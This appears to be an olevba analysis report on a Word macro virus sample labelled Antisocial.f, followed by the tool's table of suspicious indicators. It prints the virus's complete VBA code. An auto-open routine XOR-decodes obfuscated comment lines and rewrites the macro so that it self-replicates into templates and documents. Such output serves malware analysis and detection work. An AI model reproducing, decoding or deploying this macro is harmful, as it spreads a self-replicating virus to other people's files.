olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Antisocial.f-8d9b3ca406009cfe453fb589de04214a713162a4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Antisocial.f-8d9b3ca406009cfe453fb589de04214a713162a4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): Application.EnableCancelKey = wdCancelDisabled
For d = 6 To 18: C$ = "": I = (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(d, 1))
f = (Mid(I, 2, 1)): For X = 3 To Len(I): B$ = Asc(Mid(I, X, 1)) Xor f: C$ = C$ & Chr(B$): Next X: A = C$
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine d, A: Next d: Call ViewVBCode: End Sub
Private Sub ViewVBCode()
'6Ivroihu(UgpcHitkgjVtikvr&;&6
'5Juqljkv+FjkclwhFjks`wvljkv%8%5?%Juqljkv+SlwpvUwjq`fqljk%8%5
'5V`q%FH%8%QmlvAjfph`kq+SGUwjo`fq+SGFjhujk`kqv+Lq`h-4,+Fja`Hjapi`
'3Pfw#BG#>#B`wjufGl`vnfmw-UASqlif`w-UA@lnslmfmwp-Jwfn+2*-@lgfNlgvof
'3Pfw#MW#>#MlqnboWfnsobwf-UASqlif`w-UA@lnslmfmwp-Jwfn+2*-@lgfNlgvof
'7Ahu'c':'1'Sh'6?='D#':'%%='N':'/DJ)Knibt/c+'6..
'1g!<!Hou)Soe!+!9(!*!0;!Gns!Y!<!0!Un!Mdo)H(;!C%!<!@rb)Lhe)H-!Y-!0((!Yns!g;!B%!<!B%!'!Bis)C%(;!Odyu!Y;!@!<!B%
'7SontChdrjbis)QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb)UbwkfdbKnib'c+'% %'!'a'!'F='Ibs'c
'7JD':'DJ)Knibt/6+'DJ)DhrisHaKnibt.
'6GB(BcjcrcJohcu&7*&GB(EishrI`Johcu<&GB(Gbb@tikUrtoha&KE
'1OU/EdmdudMhodr!0-!OU/BntouNgMhodr;!OU/@eeGsnlRushof!LB
'4Egpmra@kgqiajp*WeraEw$BmhaJeia>9Egpmra@kgqiajp*BqhhJeia
'7 Fuebnsbu'E~'K~t'Lhqndl)))'Trhu'Jn'Dhdlrt
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

